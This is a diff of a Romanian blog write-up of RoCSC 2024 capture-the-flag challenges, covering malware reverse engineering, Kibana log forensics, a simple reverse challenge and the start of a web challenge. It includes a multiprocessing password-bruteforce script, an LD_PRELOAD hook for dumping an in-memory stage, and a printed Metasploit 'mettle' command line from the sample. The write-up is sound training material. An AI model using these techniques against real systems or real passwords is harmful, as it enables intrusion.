@@ -4,9 +4,9 @@ Enunt: 'Rezolvări pentru problemele de Jeopardy si Attack/Defense de la Olimpia
 date: 2024-06-02T00:00:00Z
 ---
 
-In acest blog voi prezenta rezolvarile pentru problemele de Jeopardy si Attack/Defense de la faza nationala a Olimpiadei de Securitate Cibernetica / finala RoCSC 2024. Voi incerca sa prezint atat rezolvarile, cat si metodologia prin care am ajuns la acestea. 
+În acest blog voi prezenta rezolvările pentru problemele de Jeopardy și Attack/Defense de la faza națională a Olimpiadei de Securitate Cibernetică / finala RoCSC 2024. Voi încerca să prezint atât rezolvările, cât și metodologia prin care am ajuns la acestea.
 
-Aceasta a fost ultima mea editie, deci sper ca materialele prezentate sa fie de folos pentru viitorii participanti. Atat pentru OSC/RoCSC, cat si pentru competitiile internationale ([ECSC](https://ecsc.eu/), [ICC](https://ecsc.eu/icc/), etc).
+Aceasta a fost ultima mea ediție, deci sper ca materialele prezentate să fie de folos pentru viitorii participanți, atât pentru OSC/RoCSC, cât și pentru competițiile internaționale ([ECSC](https://ecsc.eu/), [ICC](https://ecsc.eu/icc/), etc.).
 
 # Cuprins
 
@@ -30,25 +30,25 @@ Aceasta a fost ultima mea editie, deci sper ca materialele prezentate sa fie de 
 <a name="jeopardy"></a>
 # Jeopardy
 
-Inainte de a vorbi despre probleme, vreau sa mentionez cateva lucruri despre concursurile CTF de tip Jeopardy. O sa ma axez pe partea practica, deoarece nu as putea acoperi toate aspectele teoretice intr-un singur articol.
+Înainte de a vorbi despre probleme, vreau să menționez câteva lucruri despre concursurile CTF de tip Jeopardy. O să mă axez pe partea practică, deoarece nu aș putea acoperi toate aspectele teoretice într-un singur articol.
 
-In principiu, un concurs de tip Jeopardy este doar un concurs in care participantii trebuie sa rezolve o multime de probleme pregatite de organizatori. Cand spunem ca rezolvam o problema, este suficient sa obtinem un rezultat numit **flag**, care este de obicei un sir de caractere ce are o anumita forma (de exemplu, `CTF{sha256}`). Platformele de concurs iti ofera si feedback in timp real, deci stii daca ai obtinut flag-ul corect sau nu. <br> In plus, la multe concursuri poti vedea si clasamentul in timp real, pentru a stii cum te clasezi fata de alti participanti.
+În principiu, un concurs de tip Jeopardy este doar un concurs în care participanții trebuie să rezolve o mulțime de probleme pregătite de organizatori. Când spunem că rezolvăm o problemă, este suficient să obținem un rezultat numit **flag**, care este de obicei un șir de caractere ce are o anumită formă (de exemplu, `CTF{sha256}`). Platformele de concurs îți oferă și feedback în timp real, deci știi dacă ai obținut flag-ul corect sau nu. În plus, la multe concursuri poți vedea și clasamentul în timp real, pentru a ști cum te clasezi față de alți participanți.
 
-Un lucru fain este ca nu conteaza cum am ajuns la rezultat, ci doar ca l-am obtinut. Ceea ce este destul de diferit fata de alte concursuri sau olimpiade, unde se acorda punctaj si pentru *modalitatea de rezolvare*, sau problemele sunt facute in asa mod incat exista doar un singur mod de rezolvare. **Creativitatea** este importanta, si nu ne putem baza pe invatarea unui algoritm universal pentru a rezolvarea problemelor.
+Un lucru fain este că nu contează cum am ajuns la rezultat, ci doar că l-am obținut. Ceea ce este destul de diferit față de alte concursuri sau olimpiade, unde se acordă punctaj și pentru *modalitatea de rezolvare*, sau problemele sunt făcute în așa mod încât există doar un singur mod de rezolvare. **Creativitatea** este importantă și nu ne putem baza pe învățarea unui algoritm universal pentru rezolvarea problemelor.
 
-Un alt lucru important este **gestionarea timpului**. Nu exista punctaje partiale, deci chiar daca am fost foarte aproape sa rezolvam o problema, cat timp nu obtinem flag-ul nu o sa primim niciun punct. In principiu, acest lucru se invata doar cu experienta. Dar daca ar fi sa dau un sfat, as spune ca cel mai mult m-a ajutat sa incerc sa lucrez la cat mai multe probleme *in paralel*. Astfel incat daca este o problema pe care stiu sa o rezolv si trebuie doar sa o implementez, pot sa ma gandesc in subconstient la rezolvarea altor probleme.
+Un alt lucru important este **gestionarea timpului**. Nu există punctaje parțiale, deci chiar dacă am fost foarte aproape să rezolvăm o problemă, cât timp nu obținem flag-ul nu o să primim niciun punct. În principiu, acest lucru se învață doar cu experiență. Dar dacă ar fi să dau un sfat, aș spune că cel mai mult m-a ajutat să încerc să lucrez la cât mai multe probleme *în paralel*. Astfel, dacă este o problemă pe care știu să o rezolv și trebuie doar să o implementez, pot să mă gândesc în subconștient la rezolvarea altor probleme.
 
-In multe astfel de concursuri, problemele au **punctaj dinamic**: toate problemele incep cu acelasi numar de puncte, dar punctele acelei probleme scad pe masura ce alti participanti o rezolva. Aici intervine si partea de **strategie** la care trebuie sa ne gandim: problemele grele au mai multe puncte, dar necesita si mai mult timp. Asadar, trebuie sa ne gandim daca vrem sa alocam timp pentru ele sau ne concentram pe problemele mai usoare.
+În multe astfel de concursuri, problemele au **punctaj dinamic**: toate problemele încep cu același număr de puncte, dar punctele acelei probleme scad pe măsură ce alți participanți o rezolvă. Aici intervine și partea de **strategie** la care trebuie să ne gândim: problemele grele au mai multe puncte, dar necesită și mai mult timp. Așadar, trebuie să ne gândim dacă vrem să alocăm timp pentru ele sau ne concentrăm pe problemele mai ușoare.
 
-Cele mai intalnite categorii de probleme sunt:
-* **Web** - vulnerabilitati de securitate in aplicatii web
-* **Reverse Engineering** - dezasamblare, decompilare, analiza de cod si intelegere a unui program fara acces la codul sursa
-* **Cryptography** - criptare, decriptare, analiza de cifruri implementate gresit
-* **Pwn** - exploatare de vulnerabilitati de securitate in aplicatiile native (de obicei cele scrise in C/C++)
-* **Forensics** - analiza de fisiere, trafic de retea, capturi de memorie, etc
-* **Misc** - probleme care nu se incadreaza in nicio alta categorie. Nu mereu au treaba cu securitatea, dar necesita cunostinte tehnice
+Cele mai întâlnite categorii de probleme sunt:
+* **Web** - vulnerabilități de securitate în aplicații web
+* **Reverse Engineering** - dezasamblare, decompilare, analiză de cod și înțelegere a unui program fără acces la codul sursă
+* **Cryptography** - criptare, decriptare, analiză de cifruri implementate greșit
+* **Pwn** - exploatare de vulnerabilități de securitate în aplicațiile native (de obicei cele scrise în C/C++)
+* **Forensics** - analiză de fișiere, trafic de rețea, capturi de memorie, etc.
+* **Misc** - probleme care nu se încadrează în nicio altă categorie. Nu mereu au treabă cu securitatea, dar necesită cunoștințe tehnice
 
-Pentru concursurile individuale, este important sa avem cunostinte generale despre toate aceste categorii. Dar pentru concursurile de echipa, este important sa avem membrii cu expertiza in fiecare domeniu, din cauza punctajului dinamic.
+Pentru concursurile individuale, este important să avem cunoștințe generale despre toate aceste categorii. Dar pentru concursurile de echipă, este important să avem membri cu expertiză în fiecare domeniu, din cauza punctajului dinamic.
 
 <a name="volatile-mal"></a>
 ## volatile-mal (300 pts, 11 solves) - Reverse Engineering
@@ -64,19 +64,20 @@ Advertisment: Tratează fișierul ca și un malware. Nu rula executabilul direct
 Disclaimer: Treat the file as a malware. Do not run the binary directly on your computer, instead create a virtual machine to solve this challenge! IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY.
 ```
 
-Inainte sa incepem a rezolva orice problema, este important sa citim cu atentie enuntul, titlul si categoria pentru a obtine indicii care ne pot ajuta sa rezolvam problema. In cazul de fata, reverse engineering + malware ne indica ca va trebui sa analizam (cel mai probabil) un binar executabil.
+Înainte să începem a rezolva orice problemă, este important să citim cu atenție enunțul, titlul și categoria pentru a obține indicii care ne pot ajuta să rezolvăm problema. În cazul de față, reverse engineering + malware ne indică faptul că va trebui să analizăm (cel mai probabil) un binar executabil.
 
-Primim un binar numit `poly`. Este bine totusi ca mereu sa verificam tipul fisierului primit cu comanda `file`:
+Primim un binar numit `poly`. Este bine totuși ca mereu să verificăm tipul fișierului primit cu comanda `file`:
 ```
 $ file poly
 poly: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce1a857a7b95699164ae7e5085392079ff5006c3, for GNU/Linux 3.2.0, stripped
 ```
 
-Deci este un binar executabil de Linux, arhitectura x86 pe 64 de biti. Urmatorul pas este sa folosim un tool de dezasamblare pentru a analiza codul executabil. Personal, recomand folosirea `IDA` fata de `Ghidra` sau `Binary Ninja`, deoarece ne va face viata mai usoara prin calitatea decompilarii.
+Deci, este un binar executabil de Linux, arhitectura x86 pe 64 de biți. Următorul pas este să folosim un tool de dezasamblare pentru a analiza codul executabil. Personal, recomand folosirea `IDA` față de `Ghidra` sau `Binary Ninja`, deoarece ne va face viața mai ușoară prin calitatea decompilării.
 
-`IDA` este gratis pentru x86 pe 32/64 de biti, si foloseste un decompilator in cloud. Pentru alte arhitecturi putem folosi `Ghidra`, care este un tool gratis si open-source, oferit de NSA.
+`IDA` este gratis pentru x86 pe 32/64 de biți și folosește un decompilator în cloud. Pentru alte arhitecturi, putem folosi `Ghidra`, care este un tool gratuit și open-source, oferit de NSA.
 
-Bun, deschidem binarul in IDA si mergem catre functia main. Apasam F5 si vedem codul decompilat:
+Bun, deschidem binarul în IDA și mergem către funcția main. Apăsăm F5 și vedem codul decompilat:
+```
 
 ```c
 __int64 __fastcall main(int a1, char **a2, char **a3)
@@ -104,24 +105,20 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
 }
 ```
 
-Decompilarea arata bine, iar deoarece binarul este `dynamically linked`, avem si functiile din libc cu numele lor, deci ne scuteste de multa munca.
+Decompilarea arată bine, iar deoarece binarul este `dynamically linked`, avem și funcțiile din libc cu numele lor, deci ne scutește de multă muncă.
 
-Ce face codul dat? Cel mai usor mi se pare sa analizez programul ignorand functiile de tip `sub_0000`, pentru a avea o privire de ansamblu.
+Ce face codul dat? Cel mai ușor mi se pare să analizez programul ignorând funcțiile de tip `sub_0000`, pentru a avea o privire de ansamblu.
 
-Vedem ca prima functie apelata este `memfd_create`, care conform manualului:
+Vedem că prima funcție apelată este `memfd_create`, care conform manualului:
 ```
-memfd_create() creates an anonymous file and returns a file
-      descriptor that refers to it.  The file behaves like a regular
-      file, and so can be modified, truncated, memory-mapped, and so
-      on.  However, unlike a regular file, it lives in RAM and has a
-      volatile backing storage.  Once all references to the file are
-      dropped, it is automatically released.
+memfd_create() creează un fișier anonim și returnează un descriptor de fișier care se referă la acesta. Fișierul se comportă ca un fișier obișnuit și poate fi modificat, trunchiat, mapat în memorie și așa mai departe. Cu toate acestea, spre deosebire de un fișier obișnuit, acesta trăiește în RAM și are o stocare volatilă. Odată ce toate referințele la fișier sunt eliminate, acesta este eliberat automat.
 ```
-Pe scurt, creaza un fisier in memorie. Bun, alt indiciu, deoarece este o tactica comuna pentru malware sa aiba mai multe stagii, iar aceste stagii sa fie criptate, si decriptate in timpul executiei.
+Pe scurt, creează un fișier în memorie. Bun, alt indiciu, deoarece este o tactică comună pentru malware să aibă mai multe stadii, iar aceste stadii să fie criptate și decriptate în timpul execuției.
 
-In rest, functia main seteaza parametrii si apeleaza `fexecve`, care este un fel de `execve` (executa un alt program), dar primeste un file descriptor in loc de un path catre un fisier. Deci, binarul va executa un alt binar, care va fi creat in memorie.
+În rest, funcția main setează parametrii și apelează `fexecve`, care este un fel de `execve` (execută un alt program), dar primește un descriptor de fișier în loc de un path către un fișier. Deci, binarul va executa un alt binar, care va fi creat în memorie.
 
-Asadar, deja avem niste indicii despre ce ar putea face functiile `sub_1390` si `sub_1410`. Si le putem privi si in IDA:
+Așadar, deja avem niște indicii despre ce ar putea face funcțiile `sub_1390` și `sub_1410`. Și le putem privi și în IDA:
+
 ```c
 unsigned __int8 *__fastcall sub_1390(void *src, int a2)
 {
@@ -177,9 +174,9 @@ LABEL_8:
 }
 ```
 
-Ok, in acest punct avem 2 optiuni: Rescriem implementarea celor 2 functii intr-un program al nostru de Python/C (static analysis). Sau, mai rapid, putem folosi o metoda de analiza dinamica precum un debugger.
+Ok, în acest punct avem 2 opțiuni: Rescriem implementarea celor 2 funcții într-un program al nostru de Python/C (static analysis). Sau, mai rapid, putem folosi o metodă de analiză dinamică precum un debugger.
 
-Eu totusi am ales alta cale. Revenind la programul nostru `poly` si faptul ca este `dynamically linked`, asta inseamna ca functia `fexecve` nu exista de fapt in binar, ci este o functie din libc care va fi incarcata in timpul rularii programului de catre loader. <br> In Linux, ne putem folosi de `LD_PRELOAD` pentru a inlocui functia `fexecve` cu una proprie, care sa salveze rezultatul din acel file descriptor intr-un fisier.
+Eu totuși am ales altă cale. Revenind la programul nostru `poly` și faptul că este `dynamically linked`, asta înseamnă că funcția `fexecve` nu există de fapt în binar, ci este o funcție din libc care va fi încărcată în timpul rulării programului de către loader. În Linux, ne putem folosi de `LD_PRELOAD` pentru a înlocui funcția `fexecve` cu una proprie, care să salveze rezultatul din acel file descriptor într-un fișier.
 
 ```c
 // Cod generat de ChatGPT
@@ -224,12 +221,12 @@ int fexecve(int fd, char *const argv[], char *const envp[]) {
 }
 ```
 
-Trebuie doar sa compilam acest cod ca un shared object (biblioteca) prin comanda:
+Trebuie doar să compilăm acest cod ca un shared object (bibliotecă) prin comanda:
 ```
 $ gcc -shared -fPIC -o libintercept.so intercept.c -ldl
 ```
 
-Si sa executam programul `poly` cu `LD_PRELOAD` setat la calea catre biblioteca noastra:
+Și să executăm programul `poly` cu `LD_PRELOAD` setat la calea către biblioteca noastră:
 ```
 $ LD_PRELOAD=./libintercept.so ./poly
 fexecve called
@@ -237,17 +234,18 @@ Dumped the contents of the file descriptor to part2
 Exiting...
 ```
 
-Desigur, intr-un caz real, nu as recomanda sa rulam un binar necunoscut pe calculatorul nostru. Mai ales pentru ca nu am analizat programul complet, si este posibil ca acesta sa faca si alte lucruri inaintea functiei `main`. Dar intr-un concurs, orice metoda care ne salveaza timpul este binevenita.
+Desigur, într-un caz real, nu aș recomanda să rulăm un binar necunoscut pe calculatorul nostru. Mai ales pentru că nu am analizat programul complet, și este posibil ca acesta să facă și alte lucruri înaintea funcției `main`. Dar într-un concurs, orice metodă care ne salvează timpul este binevenită.
 
-Okay, am obtinut `part2`, rulam din nou `file` sa vedem ce tip de fisier este:
+Okay, am obținut `part2`, rulăm din nou `file` să vedem ce tip de fișier este:
 ```
 $ file part2
 part2: Python script, ASCII text executable, with very long lines (64966)
 ```
 
-`file` ne spune ca este un fisier de tip Python, deci putem folosi un editor de text (VSCode/vim) pentru a-l deschide si a vedea continutul.
+`file` ne spune că este un fișier de tip Python, deci putem folosi un editor de text (VSCode/vim) pentru a-l deschide și a vedea conținutul.
 
-Structura programului este urmatoarea:
+Structura programului este următoarea:
+
 ```python
 #!/usr/bin/python3
 from Cryptodome.Cipher import AES
@@ -274,11 +272,11 @@ with open(fn,'wb') as g: g.write(pay)
 os.execl(fn,fn)
 ```
 
-Programul cere o parola, o verifica folosind `crypt.crypt` (functie de hashing), si daca parola este corecta, decripteaza stagiul urmator folosind `AES` cu o cheie derivata din parola. Deci, trebuie sa gasim parola pentru a putea avansa cu rezolvarea problemei.
+Programul cere o parolă, o verifică folosind `crypt.crypt` (funcție de hashing), și dacă parola este corectă, decriptează stagiul următor folosind `AES` cu o cheie derivată din parolă. Deci, trebuie să găsim parola pentru a putea avansa cu rezolvarea problemei.
 
-O sa revin la ce am spus la inceput, anume ca enuntul problemei deseori ascunde indicii importante. In cazul de fata, `Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(` din enunt este un indiciu ca parola este se regaseste in colectia de parole `rockyou.txt`. (aceasta este doar o ipoteza, nu inseamna *neaparat* ca parola se va regasi in aceasta colectie, si uneori se intampla sa credem ca parti din enunt sunt indicii cand de fapt nu sunt, dar este totusi o ipoteza valida si trebuie sa o verificam).
+O să revin la ce am spus la început, anume că enunțul problemei deseori ascunde indicii importante. În cazul de față, `Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(` din enunț este un indiciu că parola se regăsește în colecția de parole `rockyou.txt`. (aceasta este doar o ipoteză, nu înseamnă *neapărat* că parola se va regăsi în această colecție, și uneori se întâmplă să credem că părți din enunț sunt indicii când de fapt nu sunt, dar este totuși o ipoteză validă și trebuie să o verificăm).
 
-Avem astfel primul topologie de problema care se regaseste in mai multe categorii, si anume *bruteforce*. In acest caz, avem 2 optiuni: folosim un tool specializat pentru asta (de ex hashcat), sau ne scriem noi propriul script de bruteforce. In timpul concursului am ales sa scriu un script de bruteforce in Python, care sa ruleze pe toate core-urile folosind `multiprocessing`. (in plus, consider ca este un skill important de a sti sa scrii propriile scripturi de bruteforce, deoarece in multe cazuri nu putem folosi tool-uri specializate).
+Avem astfel primul tip de problemă care se regăsește în mai multe categorii, și anume *bruteforce*. În acest caz, avem 2 opțiuni: folosim un tool specializat pentru asta (de ex. hashcat), sau ne scriem noi propriul script de bruteforce. În timpul concursului am ales să scriu un script de bruteforce în Python, care să ruleze pe toate core-urile folosind `multiprocessing`. (în plus, consider că este un skill important să știi să scrii propriile scripturi de bruteforce, deoarece în multe cazuri nu putem folosi tool-uri specializate).
 
 ```python
 import crypt
@@ -317,9 +315,9 @@ if __name__ == "__main__":
     main()
 ```
 
-Lasam script-ul sa ruleze, si in acest timp ne putem concentra pe alte probleme (nu stam sa pierdem timp uitandu-ne la terminal, nu o sa-l faca sa ruleze mai repede). 
+Lăsăm script-ul să ruleze, și în acest timp ne putem concentra pe alte probleme (nu stăm să pierdem timp uitându-ne la terminal, nu o să-l facă să ruleze mai repede).
 
-Script-ul s-a terminat si am gasit parola `acest000id111este222securizat333`. Stim ca parola este folosita pentru a decripta acel base64 prin AES, deci putem scrie un script de Python care sa faca asta (practic ce am gasit in part2, dar fara sa si executam binarul):
+Script-ul s-a terminat și am găsit parola `acest000id111este222securizat333`. Știm că parola este folosită pentru a decripta acel base64 prin AES, deci putem scrie un script de Python care să facă asta (practic ce am găsit în part2, dar fără să și executăm binarul):
 
 ```python
 import hashlib
@@ -343,20 +341,20 @@ pay = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc_msg), AES.block_size)
 open('part3', 'wb').write(pay)
 ```
 
-Desigur, rulam comanda `file` pentru a vedea ce tip de fisier este `part3`:
+Desigur, rulăm comanda `file` pentru a vedea ce tip de fișier este `part3`:
 ```bash
 $ file part3
 part3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped
 ```
 
-Si avem iar de a face cu un binar. Daca il deschidem in IDA, o sa vedem ca este un binar complex cu mii de functii. Asadar, in cazul de fata, cel mai simplu este sa incercam sa vedem daca putem gasi flag-ul cu `strings`, pentru a nu pierde timp analizand codul.
+Și avem iar de-a face cu un binar. Dacă îl deschidem în IDA, o să vedem că este un binar complex cu mii de funcții. Așadar, în cazul de față, cel mai simplu este să încercăm să vedem dacă putem găsi flag-ul cu `strings`, pentru a nu pierde timp analizând codul.
 
 ```bash
 $ strings part3 | grep CTF
 mettle -U "TYtji7XTYf+edph0+DMxkQ==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "https://127.0.0.1:12312/7soSKNhkUQW2o7Ch0OYZRAlA7q-vi16LBcoLNylkFX0YrS3mXA6__qNlVSC|--ua 'Mozilla/5.0 CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}'" -d "0" -o "" -b "0"
 ```
 
-Si da, am obtinut flag-ul, fara sa mai stam sa analizam `part3`. Flag-ul a fost in User Agent, asa cum a fost precizat in enunt.
+Și da, am obținut flag-ul, fără să mai stăm să analizăm `part3`. Flag-ul a fost în User Agent, așa cum a fost precizat în enunț.
 
 **CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}**
 
@@ -370,16 +368,18 @@ Investighează alertele de pe acest sistem compromis folosind Elasticsearch și 
 Pentru a obține acces la datele colectate, selectează Kibana -: Discover -: și alege 2018 ca și an de start pentru setarea timeframe-ului.
 ```
 
-Problema de forensics. Avem la dispozitie o instanta de Kibana, unde putem cauta in loguri. In general, Kibana si Elasticsearch sunt folosite impreuna cu Logstash pentru a forma ELK Stack, care poate fi folosit ca si un SIEM (Security Information and Event Management). Un SIEM este un sistem care colecteaza date de la diferite surse si le transforma intr-un format pe care il putem analiza prin query-uri. Cu aceste query-uri putem sa cream dashboard-uri, alerte, si sa investigam incidente de securitate. Cel mai important lucru atunci cand lucram cu un SIEM este sa selectam intervalul de timp corect, asa cum este mentionat si in enunt.
+Problema de forensics. Avem la dispoziție o instanță de Kibana, unde putem căuta în loguri. În general, Kibana și Elasticsearch sunt folosite împreună cu Logstash pentru a forma ELK Stack, care poate fi folosit ca un SIEM (Security Information and Event Management). Un SIEM este un sistem care colectează date de la diferite surse și le transformă într-un format pe care îl putem analiza prin query-uri. Cu aceste query-uri putem să creăm dashboard-uri, alerte și să investigăm incidente de securitate. Cel mai important lucru atunci când lucrăm cu un SIEM este să selectăm intervalul de timp corect, așa cum este menționat și în enunț.
 
-Avem 3 intrebari la care trebuie sa raspundem. 
+Avem 3 întrebări la care trebuie să răspundem.
 
-1. Q1. Identifică IP-ul mașinii compromise. 
-* Din dashboard, putem filtra prin interfata grafica pentru evenimente care contin IP sursa / desinatie. Pentru ca este vorba despre o masina compromisa, putem presupune ca este vorba despre un eveniment ce contine un IP privat (10.x.x.x, 192.168.x.x, 172.16.x.x). Intr-un eveniment gasim IP-ul **10.1.30.102** care este si primul flag.
-2. Q2. Unele evenimente din Kibana au status code 200. Identifică IP-ul sursă a acestor evenimente.
-* Ne folosim iar de interfata grafica din Kibana si selectam doar evenimentele care au status code 200. Deoarece nu sunt chiar atat de multe evenimente in log-uri si nu avem o limita de incercari, putem sa incercam IP-urile sursa ca flag, pana gasim IP-ul **198.105.244.64** corect
-3. Q3. Identifică URL path-ul folosit ăn atac. 
-* Revenim iar la interfata grafica si filtram evenimentele care contin path in URL. Vedem ca sunt foarte putine evenimente rezultate, si primul rezultat este chiar flag-ul: **/ceva/**
+1. Q1. Identifică IP-ul mașinii compromise.
+   * Din dashboard, putem filtra prin interfața grafică pentru evenimente care conțin IP sursă / destinație. Pentru că este vorba despre o mașină compromisă, putem presupune că este vorba despre un eveniment ce conține un IP privat (10.x.x.x, 192.168.x.x, 172.16.x.x). Într-un eveniment găsim IP-ul **10.1.30.102**, care este și primul flag.
+   
+2. Q2. Unele evenimente din Kibana au status code 200. Identifică IP-ul sursă al acestor evenimente.
+   * Ne folosim iar de interfața grafică din Kibana și selectăm doar evenimentele care au status code 200. Deoarece nu sunt chiar atât de multe evenimente în loguri și nu avem o limită de încercări, putem să încercăm IP-urile sursă ca flag, până găsim IP-ul **198.105.244.64** corect.
+   
+3. Q3. Identifică URL path-ul folosit în atac.
+   * Revenim iar la interfața grafică și filtrăm evenimentele care conțin path în URL. Vedem că sunt foarte puține evenimente rezultate, și primul rezultat este chiar flag-ul: **/ceva/**.
 
 <a name="discover-the-secret-inside"></a>
 ## discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response
@@ -421,13 +421,13 @@ Să se identifice algoritmul din spate folosind tehnici de Reverse Engineering.
 Flag format: CTF{sha256}
 ```
 
-O problema introductiva in Reverse Engineering. Ca intotdeauna, incepem prin a rula `file` pe fisier:
+O problemă introductivă în Reverse Engineering. Ca întotdeauna, începem prin a rula `file` pe fișier:
 ```
 $ file shift
 shift: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eca2a55a7350099798618cf194225d617659da21, for GNU/Linux 3.2.0, stripped
 ```
 
-Deci un binar de Linux, arhitetura x86 pe 64 de biti. Dynamically linked, si fara simboluri (stripped). Deschidem binarul in IDA si vedem codul decompilat:
+Deci, un binar de Linux, arhitectura x86 pe 64 de biți. Dynamically linked și fără simboluri (stripped). Deschidem binarul în IDA și vedem codul decompilat:
 
 ```c
 __int64 __fastcall main(__int64 argc, char **argv, char **envp)
@@ -460,11 +460,11 @@ __int64 __fastcall main(__int64 argc, char **argv, char **envp)
 }
 ```
 
-Am modificat semnatura functiei main, astfel incat sa stim unde avem de-a face cu argc si argv. Vedem ca programul verifica sa fie rulat cu 2 argumente. Si chiar daca ambele cazuri din if returneaza 0, putem sa presupunem ca trebuie sa satisfacem conditia `strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, plus_key)`.
+Am modificat semnătura funcției main, astfel încât să știm unde avem de-a face cu argc și argv. Vedem că programul verifică să fie rulat cu 2 argumente. Și chiar dacă ambele cazuri din if returnează 0, putem să presupunem că trebuie să satisfacem condiția `strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, v5)`.
 
-Cand rezolvam probleme de rev, este bine sa notam orice pare suspect. In cazul de fata, avem acest string de 25 de caractere in v4: `strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");`. Iar al 26-lea caracter este setat manual sa fie NULL (adica 0). Cealalta variabila suspecta este `v5`, care contine 3 valori de 8 bytes. Aceasta este doar o optimizare facuta de compilator. `v5` este o cheie care este folosita in functia `sub_124A`. Dar compilatorul a decis sa mute valorile cheii cate 8 bytes pentru a fi mai eficient. Cu toate acestea, pattern-ul este destul de evident cand privim in hex, pentru ca fiecare byte este reprezentat de 2 caractere hex.
+Când rezolvăm probleme de rev, este bine să notăm orice pare suspect. În cazul de față, avem acest șir de 25 de caractere în v4: `strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");`. Iar al 26-lea caracter este setat manual să fie NULL (adică 0). Cealaltă variabilă suspectă este `v5`, care conține 3 valori de 8 bytes. Aceasta este doar o optimizare făcută de compilator. `v5` este o cheie care este folosită în funcția `sub_124A`. Dar compilatorul a decis să mute valorile cheii câte 8 bytes pentru a fi mai eficient. Cu toate acestea, pattern-ul este destul de evident când privim în hex, pentru că fiecare byte este reprezentat de 2 caractere hex.
 
-Okay, acum sa vedem ce face functia `sub_124A`:
+Okay, acum să vedem ce face funcția `sub_124A`:
 ```c
 __int64 __fastcall sub_124A(char *a1, char *a2, char *a3)
 {
@@ -482,7 +482,7 @@ __int64 __fastcall sub_124A(char *a1, char *a2, char *a3)
 }
 ```
 
-Folosim hotkey-ul `N` in IDA si redenumim asa: a1 in argv1, a2 in str (v4 din main) si a3 (v5 din main) in key, v4 in i. Astfel, codul devine mult mai usor de citit:
+Folosim hotkey-ul `N` în IDA și redenumim a1 în argv1, a2 în str (v4 din main) și a3 (v5 din main) în key, v4 în i. Astfel, codul devine mult mai ușor de citit:
 ```c
 __int64 __fastcall sub_124A(char *argv1, char *str, char *key)
 {
@@ -500,7 +500,7 @@ __int64 __fastcall sub_124A(char *argv1, char *str, char *key)
 }
 ```
 
-Deci trebuie doar sa adunam key cu str si vom obtine parola. Pentru a nu ne complica cu transcrisul lui v5 in Python, e mai simplu sa scriem un program in C care ne afiseaza argumentul corect:
+Deci, trebuie doar să adunăm key cu str și vom obține parola. Pentru a nu ne complica cu transcrisul lui v5 în Python, e mai simplu să scriem un program în C care ne afișează argumentul corect:
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -515,27 +515,26 @@ int main() {
   *(long long int *)&plus_key[8] = 0x11100F0E0D0C0B0ALL;
   *(long long int *)&plus_key[16] = 0x1918171615141312LL;
 
-  for (int i=0;i<24;i++) {
+  for (int i = 0; i < 24; i++) {
     v4[i] = v4[i] + plus_key[i];
   }
   printf("%s\n", v4);
-
 }
 ```
 
-Compilam si rulam programul:
+Compilăm și rulăm programul:
 ```
 $ gcc solve.c -o solve
 $ ./solve
 Shift_Stuff_all_The_time
 ```
 
-Ne conectam cu netcat la server si introducem parola:
+Ne conectăm cu netcat la server și introducem parola:
 ```
 $ nc ip port
 ```
 
-Si primim flag-ul **CTF{f157c4bb8fabb5788ec40e544d29513c3f5166499231efe94db5c4f4dc245c8c}**
+Și primim flag-ul **CTF{f157c4bb8fabb5788ec40e544d29513c3f5166499231efe94db5c4f4dc245c8c}**
 
 <a name="richnotes"></a>
 ## richnotes (350 pts, 9 solves) - Web
@@ -547,7 +546,7 @@ Ceva este suspicios cu această aplicație de luat notițe.
 Flag format: CTF{sha256}
 ```
 
-Primim un link catre o aplicatie web, precum si codul sursa pentru aceasta aplicatie. Pentru aplicatiile web, este important sa identificam structura proiectului. In cazul de fata:
+Primim un link către o aplicație web, precum și codul sursă pentru această aplicație. Pentru aplicațiile web, este important să identificăm structura proiectului. În cazul de față:
 ```
 .
 ├── Dockerfile
@@ -574,9 +573,9 @@ Primim un link catre o aplicatie web, precum si codul sursa pentru aceasta aplic
 └── tsconfig.json
 ```
 
-Avem o aplicatie scrisa in node.js si foloseste TypeScript ca limbaj de programre. In `src` putem identifica `api/v1/note` care pare sa fie o **ruta**. O ruta este doar un mod de a apela codul scris in *backend* folosind protocolul HTTP (de exemplu printr-un request de tipul `GET /api/v1/note HTTP/1.1`).
+Avem o aplicație scrisă în Node.js și folosește TypeScript ca limbaj de programare. În `src` putem identifica `api/v1/note`, care pare să fie o **rută**. O rută este doar un mod de a apela codul scris în *backend* folosind protocolul HTTP (de exemplu printr-un request de tipul `GET /api/v1/note HTTP/1.1`).
 
-Este important sa identificam rutele, doarece ele reprezinta punctele de intrare pe care la avem pentru a putea gasi vulnerabilitati in aplicatiile web. `schema.ts` in general o sa contina structurile de date folosite, deci nu o sa ne intereseze la inceput. Hai sa aruncam o privire la `index.ts`
+Este important să identificăm rutele, deoarece ele reprezintă punctele de intrare pe care le avem pentru a putea găsi vulnerabilități în aplicațiile web. `schema.ts` în general o să conțină structurile de date folosite, deci nu o să ne intereseze la început. Hai să aruncăm o privire la `index.ts`.
 
 ```ts
 import { validateProperty } from 'src/zexpress/validation'
@@ -658,14 +657,14 @@ chainableRouter
   })
 ```
 
-Observam cateva lucruri interesante:
